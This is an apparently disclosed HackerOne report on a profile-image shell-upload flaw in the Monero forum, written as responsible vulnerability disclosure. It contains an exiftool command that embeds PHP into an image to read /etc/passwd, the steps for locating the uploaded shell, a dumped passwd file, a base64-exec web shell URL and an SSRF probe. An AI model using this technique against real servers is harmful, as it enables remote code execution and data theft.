---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2018-07-27
submitted: 2018-05-26T13:26:09.625Z
bounty_usd: null
votes: 43
cve: []
program: "[[programs/monero|Monero]]"
reporter: "kaulse"
source: "https://hackerone.com/reports/357858"
title: "forum.getmonero.org Shell upload"
---
# forum.getmonero.org Shell upload

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 43 | **Program:** Monero | **Disclosed:** 2018-07-27

- Report: [https://hackerone.com/reports/357858](https://hackerone.com/reports/357858)
- CWE: Code Injection
- Submitted: 2018-05-26T13:26:09.625Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 
The method uploadProfile in the UsersController allows an attacker to upload a shell to the target server due to lack of image validation.

**Description:**

## Steps To Reproduce:
  1. Open POC https://forum.getmonero.org/uploads/profile/lNobodyl1527340454.php or https://forum.getmonero.org/uploads/profile/lNobodyl1527341021.php
Or just follow these steps:
1. Find a nice picture and embed the shell into the image like this `exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png`
2. Rename the jpg/png picture to the `.php` extension.
3. Upload the picture.
4. You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp.
5. Use the timestamp to find your shell: `https://forum.getmonero.org/uploads/profile/[USERNAMAE][timestamp].php`


## Gathered infos:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
bind:x:103:109::/var/cache/bind:/bin/false
ntpd:x:104:110::/var/run/openntpd:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
fluffypony:x:1000:1000:Fluffypony,,,:/home/fluffypony:/bin/bash
postfix:x:106:114::/var/spool/postfix:/bin/false
ossec:x:1001:1001::/var/lib/dome9/ossec:/bin/false
mysql:x:107:116:MySQL Server,,,:/var/lib/mysql:/bin/false
redis:x:108:118:redis server,,,:/var/lib/redis:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
gearman:x:110:119:Gearman Job Server,,,:/var/lib/gearman:/bin/false
memcache:x:111:120:Memcached,,,:/nonexistent:/bin/false
debian-tor:x:112:121::/var/lib/tor:/bin/false
systemd-timesync:x:113:123:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:114:124:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:115:125:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:116:126:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:100:101::/run/uuidd:/bin/false
_apt:x:117:65534::/nonexistent:/bin/false
blackfire:x:999:999::/dev/null:
colord:x:118:129:colord colour management daemon,,,:/var/lib/colord:/bin/false
oident:x:119:130::/:/bin/false
```

## Impact

A hacker can hack the server ^^.

## Timeline

- **Report Filed**
- **2018-05-26** @kaulse: Very bad and small shell: 
`https://forum.getmonero.org/uploads/profile/lNobodyl1527341299.php?do=base64exec`

Example: `https://forum.getmonero.org/uploads/profile/lNobodyl1527341299.php?do=cHdk`
cHdk -> pwd: /var/www/forum.getmonero.org/webroot/public/uploads/profile

You can find the vulnerable code here: `https://github.com/monero-project/monero-forum/blob/master/app/controllers/UsersController.php#L392`.

I've found something else which should be verified too:
-> IP leak, because the server makes a request to the link param. Example: https://forum.getmonero.org/get/image?link=https://requestbin.fullcontact.com/1gypbs01
Example: https://requestbin.fullcontact.com/1gypbs01?inspect
- **2018-05-26** @kaulse: -> HTTP Header Injection in https://getmonero.org/language.php / `https://github.com/monero-project/monero-site/blob/master/language.php`. The cookie MONERO_LANG is injected into the header function without validation. CloudFlare seems to protect this site from this attack. Nevertheless, it should be validated/escaped.
- **2018-05-26** @kaulse: https://forum.getmonero.org/uploads/profile/test.txt
- **2018-05-26** @kaulse: I think this is enough evidence. I will stop to avoid damage.
- **2018-05-26** @kaulse: Oh, btw that earlier reported HTTP Header Injection Vulnerability is wrong. I didn't know that PHP prevents that since the version of 5.1.2!
- **2018-05-27** @fluffypony: Excellent find - thank you so much for that! Whilst this is technically out-of-scope, the severity is high enough that we'll make an exception. I've disabled the upload functionality, and nuked the form on the user profile settings screen. Please provide a Monero address so we can send a bounty your way.
- **2018-05-27** @kaulse: Hey @fluffypony,

thank you for the quick answer!
My Monero address is `8ApFriQxRgXNkTWevy5PDaRKcGRERPzchjaoussyoqxh3mQyDpnAK1m3AQfFeani3b4MZxJe63GrUFgorMCx4jBz1v7kLaR`.
Thanks in advance!

if you need help do not hesitate to ask!
- **2018-05-27** @kaulse: By the way, I would try to fix that vulnerability by doing something like this:
```PHP
$extension = Input::file('profile')->getClientOriginalExtension();
if (!in_array(strtolower($extension), ["jpg", "png"])) {
      return Redirect::to('/user/settings')->with('errors', array('Wrong image type!'));
}
```
- **Report Triaged**
- **2018-05-30** @fluffypony: Ok great - 25 XMR sent, transaction ID is ce8295d150e98f2c488451415061f91692f32391b70369cc181095f3eb68c599. Since we're shutting the forum down do you have any problem with us not disclosing this? Or, alternatively, once the forum is entirely gone we can disclose it via an issue on the forum GitHub repo, and note that its unsafe in the readme?
- **2018-05-30** @kaulse: I really appreciate that bounty! Thank you!

I agree we can disclose it!
- **2018-06-22** @kaulse: Quick reminder: Forum seems still be online so I assume that you changed your mind.

Can we disclose it?
- **Swag Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2018-07-27** @anonimal: Note: this issue was resolved by disabling on the server, not fixed in the code.
- **Agreed On Going Public**
- **Report Became Public**
